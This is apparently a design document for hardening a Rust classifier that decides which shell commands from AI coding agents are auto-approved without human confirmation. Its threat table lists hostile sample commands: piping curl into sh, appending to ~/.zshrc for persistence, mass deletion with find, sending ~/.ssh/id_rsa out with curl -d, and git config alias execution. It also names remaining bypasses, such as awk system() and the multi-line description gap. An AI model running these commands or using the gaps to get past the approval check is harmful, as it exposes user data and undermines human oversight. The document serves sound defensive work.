## Context

`drive.rs::classify_prompt` is the single classifier (the drive loop, the dashboard poll loop's mirror
in `poll.rs`, and `git paw __classify` → `sweep.sh classify`). Order: `extract_command_slice` (the
inline `Bash(<cmd>)` form, or the `Bash command` header form — which today returns only the
**first** non-empty line after the header) → `normalize_command` (strip leading `NAME=v`/`env`/
`nohup`, trailing `; echo $?` probe, trailing `>/dev/null 2>&1`) → danger (`is_dangerous`
substring/word patterns over `DANGER_BASE` + `os_addendum()`, `is_protected_path_violation`,
`is_git_dir_write`) → safe rules: `is_scratch_rm`, `is_managed_script_invocation`,
`is_worktree_git_op` (prefix `git add`/`git commit`), `is_worktree_dev_test_op` (already rejects
`; | & $ \` > <`), `first_whitelist_match` (per line, `is_safe_command` prefix + whitespace
boundary), `is_worktree_file_op` → else `Unknown`.

`READ_MOSTLY_VERBS` = `curl cat ls grep rg git echo sed awk find wc head tail jq mkdir touch export
tmux env`; `default_safe_commands()` adds `git commit`, `git push` (danger anyway) and
`curl http://127.0.0.1:`.

## Goals / Non-Goals

**Goals:** close the shipped holes listed in the proposal; classify GP-35's orientation command
safe; make "safe" mean every part of the command was analysed and found safe; stop the `/dev/null`
discard idiom classifying `danger` (GP-51); keep one implementation.

**Non-Goals:** a full shell parser; recursive classification of substitution bodies; changing the
danger-list beyond the GP-51 discard-redirect carve-out; changing option-index selection (that is
`broad-grant-scope-safety`); re-scoping the `git` read-mostly verb beyond its config-writing forms
(see Residual risks).

## Decisions

### D1 — A small, fail-closed lexer, not a parser

`split_segments(&str) -> Result<Vec<Segment>, Unanalysable>`: a single pass tracking single quotes,
double quotes and backslash escapes; it splits on unquoted `;`, `&&`, `||`, `|`, `&`, newline and records,
per segment, the words, every `$…` occurrence (classified simple / complex), and every redirection
(operator + target). It returns `Unanalysable` for unbalanced quotes, `$(`, backticks (outside single
quotes), `<(`/`>(`, `$((`, `${` with anything but a name inside, `<<`, a leading `(` or `{`. Pure, no
dependency, table-tested. Alternative — a shell-parsing crate — rejected (approved-dependency list; and
a "complete" parse invites believing complex syntax is safe).

### D2 — Each segment runs the existing safe rules

`segment_is_safe(seg, ctx)` applies scratch-rm, managed-script, worktree-git, worktree-dev-test and the
allowlist to the segment's words with its redirections removed (redirections are judged separately
by D4). `classify_prompt` keeps danger-first on the whole normalised command, then requires
`all(segment_is_safe)`. The `matched` label is the first segment's rule (audit log compatibility);
`option_index` selection is unchanged. `first_whitelist_match` in `drive.rs` and `poll.rs` collapse
into one `auto_approve` function.

### D3 — Simple expansions are allowed because they cannot execute

`$NAME`, `${NAME}`, `$?` expand to data; word-splitting/globbing of an unquoted expansion can change
arguments but cannot introduce a new command or redirection. Allowed in any segment. GP-35's command
classifies: `which tmux` (which), `tmux -V` (tmux), two `echo "…$VAR"` (echo) → safe. The GP-35
addendum's gate idiom `cmd > log 2>&1; echo "EXIT=$?"` keeps classifying as `cmd` (probe stripped,
in-worktree redirect target).

### D4 — Redirection targets

`>`, `>>`, `>|`, `&>`, `&>>`, `N>`: safe only to `/dev/null`, `&N`, or a path that resolves inside the
worktree via the existing `is_path_inside_worktree` (canonicalised; `..`/symlink escapes rejected).
`/dev/null` is a discard and writes nothing, which is also why D7 strips it before the danger-list.
Every other target outside the worktree is not safe: a non-`/dev/null` device target is already
`danger` under the `> /dev/` pattern (danger runs first), and anything else is `unknown`. Protected
and `.git/` targets are already `Danger`. With no worktree (root-level panes) every file target other
than `/dev/null` is `unknown`. `<` input redirection is allowed (a read).

### D5 — Mutating flags of read-mostly verbs

A segment whose verb is read-mostly but carries a curated mutating flag does not match through the
read-mostly entry: `find` with `-delete`, `-exec`, `-execdir`, `-ok`, `-okdir`, `-fprint`, `-fprint0`,
`-fprintf`, `-fls`; `sed` with `-i`/`--in-place`; `curl` with `-o`, `-O`, `--output`, `--remote-name`,
`-T`, `--upload-file`, `-d`, `--data*`, `-F`, `--form`, `--json` unless the URL starts with the
broker-localhost prefix; `git config` in any form other than a read (`--get`, `--get-all`,
`--get-regexp`, `--list`/`-l`, `get`, `list`), because a config write at any scope can make git
execute a command later (`alias.x=!cmd`, `core.pager`, `core.sshCommand`, `core.hooksPath`); and
`git -c …`, which applies such configuration inline to the same invocation. A consumer-configured
`safe_commands` or stack-preset entry that matches the segment is still honoured (operator intent).
Alternative — leave flags alone in this change — rejected: the review found `find ~ -delete`,
`curl -d @secret` and `git config alias.x '!…'` auto-approve today.

### D6 — `which` is read-mostly

Read-only (prints a path). Not a code runner, so it may take a durable grant like the other read-mostly
verbs. `command -v` is not added (`command` also executes).

### D7 — `/dev/null` discard redirects are stripped anywhere (GP-51)

`normalize_command` (or a per-segment pass the danger-list runs on) removes every `/dev/null`
discard redirect — `>`, `>>`, `1>`, `2>`, `&>`, spaced or attached, with or without a following
`2>&1` — before `is_dangerous` runs, so the `> /dev/` pattern only ever sees a real device target.
This is the only way a command leaves `danger`; it then goes through the normal per-segment rules,
so it becomes `safe` only if every segment is safe. `rm -rf / > /dev/null 2>&1` stays `danger`
(the `rm -rf` pattern still matches); `echo x > /dev/sda` stays `danger`.

### D8 — The header-form prompt contributes every line

Claude Code renders the `Bash command` prompt as the command (one or more lines) followed by an
optional one-line description, at the same indentation, then the confirmation question. Today
`extract_command_slice` returns the first non-empty line only, so line 2 of a multi-line command is
neither danger-checked nor safe-checked (verified: `echo hi` / `rm -rf ~/x` classifies `safe`).

New rule: the slice is every non-empty line between the header and the confirmation boundary. The
danger-list, protected-path and `.git/`-write rules run over **all** lines. For the safe verdict, a
line that continues the previous one (previous line ends in `\`, `|`, `&&`, `||`, or leaves a quote
open) is joined to it; the resulting lines are newline-separated segments that must each be safe —
except the last line of a block of two or more, which is treated as the rendered description and
excused from the **safe** check only. Normalisation (D7, the exit-probe strip) applies per line, so a
description line can never be swallowed by the trailing-probe strip of the line above it.

This is strictly narrower than today: today only line 1 is checked at all; afterwards every line is
danger-checked and every line but a trailing description is safe-checked.

## Security and safety review (threat analysis)

The classifier is the blast-radius control for every command git-paw auto-approves.

| Threat (rogue or mistaken agent) | Today | After |
|---|---|---|
| Arbitrary code after a safe first word (`echo x; python3 -c …`, `ls && curl … \| sh`, `curl … \| sh`) | safe | unknown |
| Command substitution in an argument (`git commit -m "$(curl …\|sh)"`, `echo $(…)`) | safe | unknown |
| Persistence via redirect (`echo '…' >> ~/.zshrc`, crontab file) | safe (unless path protected) | unknown |
| Mass delete via read-mostly verb (`find ~ -delete`) | safe | unknown |
| In-place edit outside worktree (`sed -i … ~/.ssh/config`) | safe | unknown |
| Exfiltration (`curl -d @$HOME/.ssh/id_rsa https://…`, `curl -T secret …`) | safe | unknown |
| Deferred execution via git config (`git config alias.x '!sh …'`, `git config --global core.pager …`, `git -c alias.x='!…' x`) | safe | unknown |
| Dangerous or unlisted 2nd line of a multi-line header-form prompt | safe (never extracted) | danger / unknown |
| `echo "$VAR"` / `which` orientation (GP-35) | unknown (via `which`) | safe |
| `/dev/null` discard mid-command (`cargo fmt > /dev/null 2>&1; …`, GP-51) | danger | per-segment verdict |
| Dangerous pattern anywhere (`… && rm -rf /`) | danger | danger (unchanged, whole-command) |

**Narrowing analysis (what becomes safe):** only (a) `which`; (b) a command whose only obstacle was a
`/dev/null` discard redirect (GP-51) — it is then classified on its own segments, so it is safe only
when every segment is; (c) a segment whose only obstacle was a redirection that D4 now vets
(`2>&1`, `/dev/null`, an in-worktree file), e.g. `bash -n x.sh 2>&1` for a worktree script.
Per-segment analysis itself cannot widen anything: a segment that would escalate alone still
escalates inside a compound. Simple expansions add no new execution path (D3). The danger-list
still runs first over the whole command and over every header line, so no `danger` verdict other
than the GP-51 discard can become `safe`.

**Residual risks (reported, not fixed here):** the `git` read-mostly prefix still classifies
`git -C <other repo> …`, `git merge` at the repo root and `git paw stop/purge` as safe; `awk` can run
`system()` (`awk 'BEGIN{system("…")}'` classifies safe today and after); `env`/`export` alter later
commands in the same shell. Each needs its own narrowing with dogfood data on friction. D8's
description heuristic leaves one gap: a multi-line command **without** a description whose last line
is unlisted but not dangerous (e.g. `echo hi` / `python3 x.py`) has that last line excused as the
"description". Task 3.4 checks whether the CLI's description is distinguishable in the capture
(for example rendered dim, visible with `capture-pane -e`); if it is, use that signal and drop the
heuristic.

## Risks / Trade-offs

- [More escalations: `git commit -m "$(cat msg)"`, `cmd > out.txt` outside the worktree, `curl -o`,
  `git config user.name x`] → intended; consumers can add exact patterns to `safe_commands`.
- [Lexer bugs could mis-split] → fail-closed by construction: any doubt is `Unanalysable` → `unknown`;
  table tests include adversarial quoting.
- [A description line that happens to contain a danger pattern now escalates] → accepted
  (fail-closed); descriptions are short prose and rarely name destructive commands.

## Open Questions

- Recursively classify `$(…)` bodies with the same rules (would re-allow `git commit -m "$(cat msg)"`)?
  Deferred until dogfood shows the friction.
